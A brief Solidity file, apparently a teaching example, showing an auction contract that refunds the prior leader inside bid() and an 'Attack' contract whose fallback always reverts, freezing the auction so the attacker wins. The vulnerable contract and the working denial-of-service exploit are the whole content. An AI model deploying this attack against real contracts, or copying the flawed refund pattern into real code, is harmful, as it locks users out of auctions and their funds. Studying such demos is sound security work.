
// SPDX-License-Identifier: MIT
pragma solidity ^0.4.22;

contract Auction{

    address public  currentLeader; // Current Leader 
    uint256 public highestBid; // The highestBid

    function bid() public payable {
        require (msg.value > highestBid); // Requires new bid to be greater than the actual highest bid
        require(currentLeader.send(highestBid));// Refunds to the current leader 
        currentLeader = msg.sender; // New leader 
        highestBid = msg.value; // New highest bid 


    }
}

// Attack using denial of services(Dos), basically this contract reverts every time a payment is received
//making the Auction contract unavailable to other users and winning the bid 
contract Attack {

    function attack(address addr) public payable{
        Auction(addr).bid.value(msg.value)();
    }

    function() external payable{
        revert();
    }
}
